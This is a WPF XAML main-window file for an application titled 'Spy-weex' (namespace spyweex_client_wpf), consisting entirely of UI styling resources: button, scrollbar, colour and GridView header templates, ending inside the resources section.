<Window
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        xmlns:local="clr-namespace:spyweex_client_wpf"
        xmlns:tools="clr-namespace:MyApp.Tools"
        xmlns:theme="clr-namespace:Microsoft.Windows.Themes;assembly=PresentationFramework.Aero"
        xmlns:themes="clr-namespace:Microsoft.Windows.Themes;assembly=PresentationFramework.Aero2"


        x:Class="spyweex_client_wpf.MainWindow"
        mc:Ignorable="d"
        Height="{Binding ConverterParameter=0.95, Converter={tools:RatioConverter}, Source={x:Static SystemParameters.PrimaryScreenHeight}}" 
        Width="{Binding ConverterParameter=0.90, Converter={tools:RatioConverter}, Source={x:Static SystemParameters.PrimaryScreenWidth}}" 
        WindowStartupLocation="CenterScreen"
        Title="Spy-weex" MinWidth="800" MinHeight="600" Background="#FF24282A" Foreground="#3DFFFFFF"
        Loaded="Window_Loaded">

    <Window.Resources>
        <Style x:Key="BorderBrushStyle">
            <Setter Property="Control.BorderBrush" Value="#FFBFBCBC" />
            <Setter Property="Control.BorderThickness" Value="0,1,0.5,0" />
        </Style>
        <SolidColorBrush x:Key="SelectedBackgroundBrush" Color="#FF2A6EA6" />
        <SolidColorBrush x:Key="DisabledForegroundBrush" Color="#00888888" />

        <LinearGradientBrush x:Key="SelectedViewItemBackgroundBrush" StartPoint="0,0" EndPoint="0,1">
            <GradientStop Color="#3F40506C" Offset="0" />
            <GradientStop Color="#FF1E2B44" Offset="1" />
        </LinearGradientBrush>

        <!--ButtonStyle-->
        <Style x:Key="ButtonStyle" TargetType="Button">
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="{x:Type Button}">
                        <Grid>
                            <Rectangle x:Name="GelBackground" Opacity="1" RadiusX="9" RadiusY="9" Fill="{TemplateBinding Background}" StrokeThickness="0.35">
                                <Rectangle.Stroke>
                                    <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                        <GradientStop Color="#FF6495ED" Offset="0" />
                                        <GradientStop Color="#FF6495ED" Offset="1" />
                                    </LinearGradientBrush>
                                </Rectangle.Stroke>
                            </Rectangle>
                            <Rectangle x:Name="GelShine" Margin="2,2,2,0" VerticalAlignment="Top" RadiusX="6" RadiusY="6" Opacity="1" Stroke="Transparent" Height="15px">
                                <Rectangle.Fill>
                                    <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                        <GradientStop Color="#FF6495ED" Offset="0"/>
                                        <GradientStop Color="Transparent" Offset="1"/>
                                    </LinearGradientBrush>
                                </Rectangle.Fill>
                            </Rectangle>
                            <ContentPresenter VerticalAlignment="Center" HorizontalAlignment="Center"/>
                        </Grid>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter Property="Background" Value="#FF101440">

                                </Setter>
                            </Trigger>
                            <Trigger Property="IsPressed" Value="True">
                                <Setter Property="Fill" TargetName="GelBackground">
                                    <Setter.Value>
                                        <LinearGradientBrush EndPoint="0,1" StartPoint="0,0">
                                            <GradientStop Color="#FF143632" Offset="0"/>
                                            <GradientStop Color="#FF1F1FF3" Offset="1"/>
                                        </LinearGradientBrush>
                                    </Setter.Value>
                                </Setter>
                            </Trigger>
                            <Trigger Property="IsEnabled" Value="False">
                                <Setter Property="Fill" TargetName="GelBackground" Value="LightGray">

                                </Setter>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
            <Setter Property="Background" Value="#FF1D2123"/>
            <Setter Property="Foreground" Value="White"/>
            <Setter Property="Width" Value="auto"/>
            <Setter Property="Height" Value="25"/>
        </Style>

        <!--ScrollViewer STYLE-->
        <!--<Style x:Key="MyOwnScrollViewer" 
           TargetType="{x:Type ScrollViewer}">
            <Setter Property="HorizontalScrollBarVisibility" Value="Hidden"/>
            <Setter Property="VerticalScrollBarVisibility" Value="Hidden"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="{x:Type ScrollViewer}">
                        <Grid>
                            <Grid Background="{TemplateBinding Background}">
                                <ScrollContentPresenter 
                                    x:Name="PART_ScrollContentPresenter"
                                    Margin="{TemplateBinding Padding}"
                                    Content="{TemplateBinding Content}"
                                    ContentTemplate="{TemplateBinding ContentTemplate}"
                                    CanContentScroll="{TemplateBinding CanContentScroll}"/>
                            </Grid>
                            <Grid Background="Transparent">
                                <Grid.ColumnDefinitions>
                                    <ColumnDefinition Width="*"/>
                                    <ColumnDefinition Width="Auto"/>
                                </Grid.ColumnDefinitions>
                                <Grid.RowDefinitions>
                                    <RowDefinition Height="*"/>
                                    <RowDefinition Height="Auto"/>
                                </Grid.RowDefinitions>
                                <ScrollBar 
                                    x:Name="PART_VerticalScrollBar"
                                    Grid.Column="1"
                                    Minimum="0.0"
                                    Maximum="{TemplateBinding ScrollableHeight}"
                                    ViewportSize="{TemplateBinding ViewportHeight}"
                                    Value="{Binding RelativeSource={RelativeSource TemplatedParent}, Path=VerticalOffset, Mode=OneWay}"
                                    Visibility="{TemplateBinding ComputedVerticalScrollBarVisibility}"         
                                    Cursor="Arrow"
                                    AutomationProperties.AutomationId="VerticalScrollBar"/>
                                <ScrollBar 
                                    x:Name="PART_HorizontalScrollBar"
                                    Orientation="Horizontal"
                                    Grid.Row="1"
                                    Minimum="0.0"
                                    Maximum="{TemplateBinding ScrollableWidth}"
                                    ViewportSize="{TemplateBinding ViewportWidth}"
                                    Value="{Binding RelativeSource={RelativeSource TemplatedParent}, Path=HorizontalOffset, Mode=OneWay}"
                                    Visibility="{TemplateBinding ComputedHorizontalScrollBarVisibility}"
                                    Cursor="Arrow"
                                    AutomationProperties.AutomationId="HorizontalScrollBar"/>
                            </Grid>
                        </Grid>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
            <Style.Triggers>
                <Trigger Property="IsEnabled" 
                     Value="false">
                    <Setter Property="Foreground" 
                        Value="{DynamicResource {x:Static SystemColors.GrayTextBrushKey}}"/>
                </Trigger>
                <Trigger Property="IsMouseOver"
                     Value="true">
                    <Setter Property="HorizontalScrollBarVisibility"
                        Value="Visible"/>
                    <Setter Property="VerticalScrollBarVisibility"
                        Value="Visible"/>
                </Trigger>
            </Style.Triggers>
        </Style>-->
        
        <!--<Style x:Key="ScrollBarButton"
           TargetType="{x:Type RepeatButton}">
            <Setter Property="OverridesDefaultStyle"
                Value="true"/>
            <Setter Property="Focusable"
                Value="false"/>
            <Setter Property="IsTabStop"
                Value="false"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="{x:Type RepeatButton}">
                        <Path x:Name="Arrow" HorizontalAlignment="Center" VerticalAlignment="Center" Fill="{TemplateBinding Background}"/>
                        <ControlTemplate.Triggers>
                            <Trigger Property="theme:ScrollChrome.ScrollGlyph" Value="UpArrow">
                                <Setter TargetName="Arrow" Property="Data" Value="M 3,0 l 3,8 l -6,0 Z"/>
                            </Trigger>
                            <Trigger Property="theme:ScrollChrome.ScrollGlyph" Value="DownArrow">
                                <Setter TargetName="Arrow" Property="Data" Value="M 0,0 l 6,0 l -3,8 Z"/>
                            </Trigger>
                            <Trigger Property="theme:ScrollChrome.ScrollGlyph" Value="LeftArrow">
                                <Setter TargetName="Arrow" Property="Data" Value="M 0,3 l 8,-3 l 0,6 Z"/>
                            </Trigger>
                            <Trigger Property="theme:ScrollChrome.ScrollGlyph" Value="RightArrow">
                                <Setter TargetName="Arrow" Property="Data" Value="M 0,0 l 8,3 l -8,3 Z"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
        <Style x:Key="ScrollBarThumb"
           TargetType="{x:Type Thumb}">
            <Setter Property="OverridesDefaultStyle"
                Value="true"/>
            <Setter Property="IsTabStop"
                Value="false"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="{x:Type Thumb}">
                        <Border Background="#FF777777" CornerRadius="2"/>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
        <Style x:Key="HorizontalScrollBarPageButton"
           TargetType="{x:Type RepeatButton}">
            <Setter Property="OverridesDefaultStyle"
                Value="true"/>
            <Setter Property="Background"
                Value="Transparent"/>
            <Setter Property="Focusable"
                Value="false"/>
            <Setter Property="IsTabStop"
                Value="false"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="{x:Type RepeatButton}">
                        <Rectangle Fill="{TemplateBinding Background}"
                               Width="{TemplateBinding Width}"
                               Height="{TemplateBinding Height}"/>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
        <Style x:Key="VerticalScrollBarPageButton"
           TargetType="{x:Type RepeatButton}">
            <Setter Property="OverridesDefaultStyle"
                Value="true"/>
            <Setter Property="Background"
                Value="Transparent"/>
            <Setter Property="Focusable"
                Value="false"/>
            <Setter Property="IsTabStop"
                Value="false"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="{x:Type RepeatButton}">
                        <Rectangle Fill="{TemplateBinding Background}"
                               Width="{TemplateBinding Width}"
                               Height="{TemplateBinding Height}"/>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
        <Style x:Key="{x:Type ScrollBar}"
           TargetType="{x:Type ScrollBar}">
            <Setter Property="Background"
                Value="#FF979797"/>
            <Setter Property="Stylus.IsPressAndHoldEnabled"
                Value="false"/>
            <Setter Property="Stylus.IsFlicksEnabled"
                Value="false"/>
            <Setter Property="Foreground"
                Value="{DynamicResource {x:Static SystemColors.ControlTextBrushKey}}"/>
            <Setter Property="Width"
                Value="{DynamicResource {x:Static SystemParameters.VerticalScrollBarWidthKey}}"/>
            <Setter Property="MinWidth"
                Value="{DynamicResource {x:Static SystemParameters.VerticalScrollBarWidthKey}}"/>
            <Setter Property="Margin"
                Value="2"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="{x:Type ScrollBar}">
                        <Border 
                            x:Name="Bg"
                            CornerRadius="2"                         
                            Margin="2"
                            Opacity="0.75"
                            Background="{TemplateBinding Background}"
                            VerticalAlignment="Bottom">
                            <Grid
                                SnapsToDevicePixels="true">
                                <Grid.RowDefinitions>
                                    <RowDefinition MaxHeight="{DynamicResource {x:Static SystemParameters.VerticalScrollBarButtonHeightKey}}"/>
                                    <RowDefinition MaxHeight="{DynamicResource {x:Static SystemParameters.VerticalScrollBarButtonHeightKey}}"/>
                                </Grid.RowDefinitions>
                                <RepeatButton
                                    Style="{StaticResource ScrollBarButton}"
                                    Background="#FFCBCBCB"                                    
                                    IsEnabled="{TemplateBinding IsMouseOver}"
                                    Command="{x:Static ScrollBar.LineUpCommand}"
                                    theme:ScrollChrome.ScrollGlyph="UpArrow"
                                    Margin="0,4"/>
                                <RepeatButton                   
                                    Style="{StaticResource ScrollBarButton}"
                                    Background="#FFCBCBCB"
                                    Grid.Row="1"
                                    IsEnabled="{TemplateBinding IsMouseOver}"
                                    Command="{x:Static ScrollBar.LineDownCommand}"
                                    theme:ScrollChrome.ScrollGlyph="DownArrow"
                                    Margin="0,4">
                                </RepeatButton>
                            </Grid>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsEnabled"
                                 Value="false">
                                <Setter TargetName="Bg"
                                    Property="Visibility"
                                    Value="Hidden"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
            <Style.Triggers>
                <MultiTrigger>
                    <MultiTrigger.Conditions>
                        <Condition Property="IsMouseOver" Value="True"/>
                        <Condition Property="Orientation" Value="Vertical"/>
                    </MultiTrigger.Conditions>
                    <MultiTrigger.Setters>
                        <Setter Property="Width"
                            Value="30"/>
                        <Setter
                            Property="Template">
                            <Setter.Value>
                                <ControlTemplate TargetType="{x:Type ScrollBar}">
                                    <Border 
                                        CornerRadius="4"                         
                                        Margin="2"
                                        Opacity="0.75"
                                        Background="{TemplateBinding Background}">
                                        <Grid
                                            SnapsToDevicePixels="true">
                                            <Grid.RowDefinitions>
                                                <RowDefinition Height="0.00001*"/>
                                                <RowDefinition MaxHeight="{DynamicResource {x:Static SystemParameters.VerticalScrollBarButtonHeightKey}}"/>
                                                <RowDefinition MaxHeight="{DynamicResource {x:Static SystemParameters.VerticalScrollBarButtonHeightKey}}"/>
                                            </Grid.RowDefinitions>
                                            <Track
                                                Name="PART_Track"
                                                IsEnabled="{TemplateBinding IsMouseOver}"
                                                IsDirectionReversed="true">
                                                <Track.DecreaseRepeatButton>
                                                    <RepeatButton Style="{StaticResource VerticalScrollBarPageButton}"
                                                        Command="{x:Static ScrollBar.PageUpCommand}"/>
                                                </Track.DecreaseRepeatButton>
                                                <Track.IncreaseRepeatButton>
                                                    <RepeatButton Style="{StaticResource VerticalScrollBarPageButton}"
                                                        Command="{x:Static ScrollBar.PageDownCommand}"/>
                                                </Track.IncreaseRepeatButton>
                                                <Track.Thumb>
                                                    <Thumb Style="{StaticResource ScrollBarThumb}"
                                                        theme:ScrollChrome.ScrollGlyph="VerticalGripper"
                                                        Margin="2"/>
                                                </Track.Thumb>
                                            </Track>
                                            <RepeatButton
                                                Style="{StaticResource ScrollBarButton}"
                                                Background="#FFFFFFFF"
                                                Grid.Row="1"
                                                IsEnabled="{TemplateBinding IsMouseOver}"
                                                Command="{x:Static ScrollBar.LineUpCommand}"
                                                theme:ScrollChrome.ScrollGlyph="UpArrow"
                                                RenderTransformOrigin="0.5, 0.5">
                                                <RepeatButton.RenderTransform>
                                                    <ScaleTransform ScaleX="1.5" ScaleY="1.5"/>
                                                </RepeatButton.RenderTransform>
                                            </RepeatButton>
                                            <RepeatButton                           
                                                Style="{StaticResource ScrollBarButton}"
                                                Background="#FFFFFFFF"
                                                Grid.Row="2"
                                                IsEnabled="{TemplateBinding IsMouseOver}"
                                                Command="{x:Static ScrollBar.LineDownCommand}"
                                                theme:ScrollChrome.ScrollGlyph="DownArrow"
                                                RenderTransformOrigin="0.5, 0.5">
                                                <RepeatButton.RenderTransform>
                                                    <ScaleTransform ScaleX="1.5" ScaleY="1.5"/>
                                                </RepeatButton.RenderTransform>
                                            </RepeatButton>
                                        </Grid>
                                    </Border>
                                </ControlTemplate>
                            </Setter.Value>
                        </Setter>
                    </MultiTrigger.Setters>
                </MultiTrigger>
                <MultiTrigger>
                    <MultiTrigger.Conditions>
                        <Condition Property="Orientation" Value="Horizontal"/>
                        <Condition Property="IsMouseOver" Value="False"/>
                    </MultiTrigger.Conditions>
                    <MultiTrigger.Setters>
                        <Setter Property="Width"
                            Value="Auto"/>
                        <Setter Property="MinWidth"
                            Value="0"/>
                        <Setter Property="Height"
                            Value="{DynamicResource {x:Static SystemParameters.HorizontalScrollBarHeightKey}}"/>
                        <Setter Property="MinHeight"
                            Value="{DynamicResource {x:Static SystemParameters.HorizontalScrollBarHeightKey}}"/>
                        <Setter Property="Template">
                            <Setter.Value>
                                <ControlTemplate TargetType="{x:Type ScrollBar}">
                                    <Border 
                                        x:Name="Bg"
                                        CornerRadius="2"                         
                                        Margin="2"
                                        Opacity="0.75"
                                        Background="{TemplateBinding Background}"
                                        HorizontalAlignment="Right">
                                        <Grid
                                            SnapsToDevicePixels="true">
                                            <Grid.ColumnDefinitions>
                                                <ColumnDefinition MaxWidth="{DynamicResource {x:Static SystemParameters.HorizontalScrollBarButtonWidthKey}}"/>
                                                <ColumnDefinition MaxWidth="{DynamicResource {x:Static SystemParameters.HorizontalScrollBarButtonWidthKey}}"/>
                                            </Grid.ColumnDefinitions>
                                            <RepeatButton
                                                Style="{StaticResource ScrollBarButton}"    
                                                Background="#FFCBCBCB"
                                                IsEnabled="{TemplateBinding IsMouseOver}"
                                                Command="{x:Static ScrollBar.LineLeftCommand}"
                                                theme:ScrollChrome.ScrollGlyph="LeftArrow"
                                                Margin="4,0"/>
                                            <RepeatButton
                                                Style="{StaticResource ScrollBarButton}"                                        
                                                Background="#FFCBCBCB"
                                                Grid.Column="1"
                                                IsEnabled="{TemplateBinding IsMouseOver}"
                                                Command="{x:Static ScrollBar.LineRightCommand}"
                                                theme:ScrollChrome.ScrollGlyph="RightArrow"
                                                Margin="4,0"/>
                                        </Grid>
                                    </Border>
                                    <ControlTemplate.Triggers>
                                        <Trigger Property="IsEnabled"
                                             Value="false">
                                            <Setter TargetName="Bg"
                                                Property="Visibility"
                                                Value="Hidden"/>
                                        </Trigger>
                                    </ControlTemplate.Triggers>
                                </ControlTemplate>
                            </Setter.Value>
                        </Setter>
                    </MultiTrigger.Setters>
                </MultiTrigger>
                <MultiTrigger>
                    <MultiTrigger.Conditions>
                        <Condition Property="IsMouseOver" Value="True"/>
                        <Condition Property="Orientation" Value="Horizontal"/>
                    </MultiTrigger.Conditions>
                    <MultiTrigger.Setters>
                        <Setter Property="Width"
                            Value="Auto"/>
                        <Setter Property="MinWidth"
                            Value="0"/>
                        <Setter Property="Height"
                            Value="{DynamicResource {x:Static SystemParameters.HorizontalScrollBarHeightKey}}"/>
                        <Setter Property="MinHeight"
                            Value="{DynamicResource {x:Static SystemParameters.HorizontalScrollBarHeightKey}}"/>
                        <Setter Property="Height"
                            Value="30"/>
                        <Setter
                            Property="Template">
                            <Setter.Value>
                                <ControlTemplate TargetType="{x:Type ScrollBar}">
                                    <Border 
                                        CornerRadius="4"                         
                                        Margin="2"
                                        Opacity="0.75"
                                        Background="{TemplateBinding Background}">
                                        <Grid
                                            SnapsToDevicePixels="true">
                                            <Grid.ColumnDefinitions>
                                                <ColumnDefinition Width="0.00001*"/>
                                                <ColumnDefinition MaxWidth="{DynamicResource {x:Static SystemParameters.HorizontalScrollBarButtonWidthKey}}"/>
                                                <ColumnDefinition MaxWidth="{DynamicResource {x:Static SystemParameters.HorizontalScrollBarButtonWidthKey}}"/>
                                            </Grid.ColumnDefinitions>
                                            <Track
                                                Name="PART_Track"
                                                IsEnabled="{TemplateBinding IsMouseOver}">
                                                <Track.DecreaseRepeatButton>
                                                    <RepeatButton Style="{StaticResource HorizontalScrollBarPageButton}"
                                                      Command="{x:Static ScrollBar.PageLeftCommand}"/>
                                                </Track.DecreaseRepeatButton>
                                                <Track.IncreaseRepeatButton>
                                                    <RepeatButton Style="{StaticResource HorizontalScrollBarPageButton}"
                                                      Command="{x:Static ScrollBar.PageRightCommand}"/>
                                                </Track.IncreaseRepeatButton>
                                                <Track.Thumb>
                                                    <Thumb x:Name="Thumb" Style="{StaticResource ScrollBarThumb}"
                                                       theme:ScrollChrome.ScrollGlyph="HorizontalGripper"
                                                       Margin="2"/>
                                                </Track.Thumb>
                                            </Track>
                                            <RepeatButton
                                                Style="{StaticResource ScrollBarButton}"
                                                Background="#FFFFFFFF"
                                                Grid.Column="1"
                                                IsEnabled="{TemplateBinding IsMouseOver}"
                                                Command="{x:Static ScrollBar.LineLeftCommand}"
                                                theme:ScrollChrome.ScrollGlyph="LeftArrow"
                                                RenderTransformOrigin="0.5, 0.5">
                                                <RepeatButton.RenderTransform>
                                                    <ScaleTransform ScaleX="1.5" ScaleY="1.5"/>
                                                </RepeatButton.RenderTransform>
                                            </RepeatButton>
                                            <RepeatButton                           
                                                Style="{StaticResource ScrollBarButton}"
                                                Background="#FFFFFFFF"
                                                Grid.Column="2"
                                                IsEnabled="{TemplateBinding IsMouseOver}"
                                                Command="{x:Static ScrollBar.LineRightCommand}"
                                                theme:ScrollChrome.ScrollGlyph="RightArrow"
                                                RenderTransformOrigin="0.5, 0.5">
                                                <RepeatButton.RenderTransform>
                                                    <ScaleTransform ScaleX="1.5" ScaleY="1.5"/>
                                                </RepeatButton.RenderTransform>
                                            </RepeatButton>
                                        </Grid>
                                    </Border>
                                </ControlTemplate>
                            </Setter.Value>
                        </Setter>
                    </MultiTrigger.Setters>
                </MultiTrigger>
            </Style.Triggers>
        </Style>-->
        
        <!--Control colors.-->
        <Color x:Key="SelectedBackgroundColor">#FFC5CBF9</Color>
        <Color x:Key="SelectedUnfocusedColor">#FFDDDDDD</Color>

        <Color x:Key="ControlLightColor">White</Color>
        <Color x:Key="ControlMediumColor">#FF7381F9</Color>

        <Color x:Key="ControlMouseOverColor">#FF3843C4</Color>

        <Color x:Key="GlyphColor">#FF444444</Color>
        <Color x:Key="GlyphMouseOver">sc#1, 0.004391443, 0.002428215, 0.242281124</Color>

        <!--Border colors-->
        <Color x:Key="BorderLightColor">#FFCCCCCC</Color>
        <Color x:Key="BorderMediumColor">#FF888888</Color>
        <Color x:Key="BorderDarkColor">#FF444444</Color>

        <Color x:Key="DisabledBorderLightColor">#FFAAAAAA</Color>

        <!--Control-specific resources.-->

        <LinearGradientBrush x:Key="MenuPopupBrush"
                     EndPoint="0.5,1"
                     StartPoint="0.5,0">
            <GradientStop Color="{DynamicResource ControlLightColor}"
                Offset="0" />
            <GradientStop Color="{DynamicResource ControlMediumColor}"
                Offset="0.5" />
            <GradientStop Color="{DynamicResource ControlLightColor}"
                Offset="1" />
        </LinearGradientBrush>

        <LinearGradientBrush x:Key="ProgressBarIndicatorAnimatedFill"
                     StartPoint="0,0"
                     EndPoint="1,0">
            <LinearGradientBrush.GradientStops>
                <GradientStopCollection>
                    <GradientStop Color="#000000FF"
                    Offset="0" />
                    <GradientStop Color="#600000FF"
                    Offset="0.4" />
                    <GradientStop Color="#600000FF"
                    Offset="0.6" />
                    <GradientStop Color="#000000FF"
                    Offset="1" />
                </GradientStopCollection>
            </LinearGradientBrush.GradientStops>
        </LinearGradientBrush>
        
        <Style x:Key="{x:Static GridView.GridViewScrollViewerStyleKey}" TargetType="ScrollViewer">
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="ScrollViewer">
                        <Grid Background="Transparent">
                            <Grid.ColumnDefinitions>
                                <ColumnDefinition Width="*" />
                                <ColumnDefinition Width="Auto" />
                            </Grid.ColumnDefinitions>
                            <Grid.RowDefinitions>
                                <RowDefinition Height="*" />
                                <RowDefinition Height="Auto" />
                            </Grid.RowDefinitions>

                            <DockPanel Margin="{TemplateBinding Padding}">
                                <ScrollViewer DockPanel.Dock="Top"
                                              HorizontalScrollBarVisibility="Hidden"
                                              VerticalScrollBarVisibility="Hidden"
                                              Focusable="false">

                                    <GridViewHeaderRowPresenter Margin="2,0,2,0"
                                          Columns="{Binding Path=TemplatedParent.View.Columns,
                                                    RelativeSource={RelativeSource TemplatedParent}}"
                                          ColumnHeaderContainerStyle="{Binding
                                                    Path=TemplatedParent.View.ColumnHeaderContainerStyle,
                                                    RelativeSource={RelativeSource TemplatedParent}}"
                                          ColumnHeaderTemplate="{Binding
                                                    Path=TemplatedParent.View.ColumnHeaderTemplate,
                                                    RelativeSource={RelativeSource TemplatedParent}}"
                                          ColumnHeaderTemplateSelector="{Binding 
                                                    Path=TemplatedParent.View.ColumnHeaderTemplateSelector,
                                                    RelativeSource={RelativeSource TemplatedParent}}"
                                          AllowsColumnReorder="{Binding
                                                    Path=TemplatedParent.View.AllowsColumnReorder,
                                                    RelativeSource={RelativeSource TemplatedParent}}"
                                          ColumnHeaderContextMenu="{Binding
                                                    Path=TemplatedParent.View.ColumnHeaderContextMenu,
                                                    RelativeSource={RelativeSource TemplatedParent}}"
                                          ColumnHeaderToolTip="{Binding
                                                    Path=TemplatedParent.View.ColumnHeaderToolTip,
                                                    RelativeSource={RelativeSource TemplatedParent}}"
                                          SnapsToDevicePixels="{TemplateBinding SnapsToDevicePixels}" />
                                </ScrollViewer>

                                <ScrollContentPresenter Name="PART_ScrollContentPresenter"
                                    KeyboardNavigation.DirectionalNavigation="Local"
                                    CanContentScroll="True"
                                    CanHorizontallyScroll="False"
                                    CanVerticallyScroll="False" />
                            </DockPanel>

                            <ScrollBar Name="PART_HorizontalScrollBar"
                                 Orientation="Horizontal"
                                 Grid.Row="1"
                                 Maximum="{TemplateBinding ScrollableWidth}"
                                 ViewportSize="{TemplateBinding ViewportWidth}"
                                 Value="{TemplateBinding HorizontalOffset}"
                                 Visibility="{TemplateBinding ComputedHorizontalScrollBarVisibility}" />

                            <ScrollBar Name="PART_VerticalScrollBar"
                                 Grid.Column="1"
                                 Maximum="{TemplateBinding ScrollableHeight}"
                                 ViewportSize="{TemplateBinding ViewportHeight}"
                                 Value="{TemplateBinding VerticalOffset}"
                                 Visibility="{TemplateBinding ComputedVerticalScrollBarVisibility}" />

                        </Grid>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

        <Style x:Key="GridViewColumnHeaderGripper" TargetType="Thumb">
            <Setter Property="Width" Value="18" />
            <Setter Property="Background">
                <Setter.Value>
                    <LinearGradientBrush StartPoint="0,0"
                           EndPoint="0,1">
                        <LinearGradientBrush.GradientStops>
                            <GradientStopCollection>
                                <GradientStop Color="{DynamicResource BorderLightColor}" Offset="0.0" />
                                <GradientStop Color="{DynamicResource BorderDarkColor}" Offset="1.0" />
                            </GradientStopCollection>
                        </LinearGradientBrush.GradientStops>
                    </LinearGradientBrush>
                </Setter.Value>
            </Setter>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="{x:Type Thumb}">
                        <Border Padding="{TemplateBinding Padding}" Background="Transparent">
                            <Rectangle HorizontalAlignment="Center" Width="1" Fill="{TemplateBinding Background}" />
                        </Border>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
            <Setter Property="BorderBrush">
                <Setter.Value>
                    <LinearGradientBrush EndPoint="0.5,1"
                           StartPoint="0.5,0">
                        <GradientStop Color="Black" Offset="0" />
                        <GradientStop Color="White" Offset="1" />
                    </LinearGradientBrush>
                </Setter.Value>
            </Setter>
        </Style>

        <Style x:Key="{x:Type GridViewColumnHeader}" TargetType="GridViewColumnHeader">
            <Setter Property="HorizontalContentAlignment" Value="Center" />
            <Setter Property="VerticalContentAlignment" Value="Center" />
            <Setter Property="Foreground" Value="{DynamicResource {x:Static SystemColors.ControlTextBrushKey}}" />
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="GridViewColumnHeader">
                        <Grid>
                            <VisualStateManager.VisualStateGroups>
                                <VisualStateGroup x:Name="CommonStates">
                                    <VisualState x:Name="Normal" />
                                    <VisualState x:Name="MouseOver">
                                        <Storyboard>
                                            <ColorAnimationUsingKeyFrames 
                                                Storyboard.TargetProperty="(Panel.Background).(GradientBrush.GradientStops)[1].(GradientStop.Color)"
                                                Storyboard.TargetName="HeaderBorder">
                                                <EasingColorKeyFrame KeyTime="0" Value="{StaticResource ControlMouseOverColor}" />
                                            </ColorAnimationUsingKeyFrames>
                                        </Storyboard>
                                    </VisualState>
                                    <VisualState x:Name="Pressed" />
                                    <VisualState x:Name="Disabled" />
                                </VisualStateGroup>
                            </VisualStateManager.VisualStateGroups>
                            <Border x:Name="HeaderBorder" BorderThickness="0,1,0,1" Padding="2,0,2,0">
                                <Border.BorderBrush>
                                    <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                        <LinearGradientBrush.GradientStops>
                                            <GradientStopCollection>
                                                <GradientStop Color="{DynamicResource BorderLightColor}" Offset="0.0" />
                                                <GradientStop Color="{DynamicResource BorderDarkColor}" Offset="1.0" />
                                            </GradientStopCollection>
                                        </LinearGradientBrush.GradientStops>
                                    </LinearGradientBrush>

                                </Border.BorderBrush>
                                <Border.Background>

                                    <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                        <LinearGradientBrush.GradientStops>
                                            <GradientStopCollection>
                                                <GradientStop Color="{DynamicResource ControlLightColor}" Offset="0.0" />
                                                <GradientStop Color="{DynamicResource ControlMediumColor}" Offset="1.0" />
                                            </GradientStopCollection>
                                        </LinearGradientBrush.GradientStops>
                                    </LinearGradientBrush>

                                </Border.Background>
                                <ContentPresenter x:Name="HeaderContent"
                                          Margin="0,0,0,1"
                                          RecognizesAccessKey="True"
                                          VerticalAlignment="{TemplateBinding VerticalContentAlignment}"
                                          HorizontalAlignment="{TemplateBinding HorizontalContentAlignment}"
                                          SnapsToDevicePixels="{TemplateBinding SnapsToDevicePixels}"/>
                            </Border>
                            <Thumb x:Name="PART_HeaderGripper"
                                         HorizontalAlignment="Right"
                                         Margin="0,0,-9,0"
                                         Style="{StaticResource GridViewColumnHeaderGripper}" />
                        </Grid>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
            <Style.Triggers>
                <Trigger Property="Role" Value="Floating">
                    <Setter Property="Opacity" Value="0.7" />
                    <Setter Property="Template">
                        <Setter.Value>
                            <ControlTemplate TargetType="GridViewColumnHeader">
                                <Canvas Name="PART_FloatingHeaderCanvas">
                                    <Rectangle Fill="#60000000"
                                     Width="{TemplateBinding ActualWidth}"
                                     Height="{TemplateBinding ActualHeight}" />
                                </Canvas>
                            </ControlTemplate>
                        </Setter.Value>
                    </Setter>
                </Trigger>
                <Trigger Property="Role" Value="Padding">
                    <Setter Property="Template">
                        <Setter.Value>
                            <ControlTemplate TargetType="GridViewColumnHeader">
                                <Border Name="HeaderBorder" BorderThickness="0,1,0,1">
                                    <Border.Background>
                                        <SolidColorBrush Color="{DynamicResource ControlLightColor}" />
                                    </Border.Background>
                                    <Border.BorderBrush>
                                        <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                            <LinearGradientBrush.GradientStops>
                                                <GradientStopCollection>
                                                    <GradientStop Color="{DynamicResource BorderLightColor}" Offset="0.0" />
                                                    <GradientStop Color="{DynamicResource BorderDarkColor}" Offset="1.0" />
                                                </GradientStopCollection>
                                            </LinearGradientBrush.GradientStops>
                                        </LinearGradientBrush>
                                    </Border.BorderBrush>
                                </Border>
                            </ControlTemplate>
                        </Setter.Value>
                    </Setter>
                </Trigger>
            </Style.Triggers>
        </Style>

